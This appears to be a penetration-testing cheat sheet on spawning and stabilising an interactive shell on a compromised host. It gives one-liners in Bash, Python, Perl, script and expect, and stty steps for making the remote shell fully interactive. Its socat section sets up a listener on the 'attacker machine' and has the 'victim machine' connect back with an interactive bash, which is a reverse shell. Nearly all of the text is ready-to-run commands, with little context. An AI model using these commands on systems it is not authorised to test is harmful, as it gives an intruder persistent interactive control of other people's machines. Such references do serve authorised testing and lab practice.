# Spawn TTY

**Bash**

```bash
/bin/bash -i
echo os.system('/bin/bash')
/bin/sh -i
```

**Python**

```python
python -c "import pty; pty.spawn('/bin/bash')"
```

**Perl**

```perl
perl -e 'exec "/bin/bash";'
```

**Socat**

On the attacker machine, set up socat listener: replace 4444 with your listening port.

```
socat -,raw,echo=0 tcp-listen:4444
```

On the victim machine, connect back the attacker machine and spawn a shell. Replace `<host>` with attacker IP and `<port>` with attacker listing port.

```
$ socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<host>:<port>
```

**Misc**

```
/usr/bin/script -qc /bin/bash /dev/null
/usr/bin/expect sh
```

**Interactive TTY**

* Backgrounding the _remote_ shell with **CTRL-Z**:

```
user@remote:~$ ^Z
```

* Getting ROWS and COLS within current terminal window:

```
user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

* Ignoring hotkeys in the _local_ shell and getting back to the _remote_:

```
user@local:~$ stty raw -echo; fg
```

* Setting correct size for the _remote_ shell (where `ROWS` and `COLS` are the values from the 3rd bullet):

```
user@remote:~$ stty rows ROWS cols COLS
```

* Adding some colors:

```
user@remote:~$ export TERM=xterm-256color
```

* Reloading bash to apply the TERM variable:

```
user@remote:~$ exec /bin/bash
```
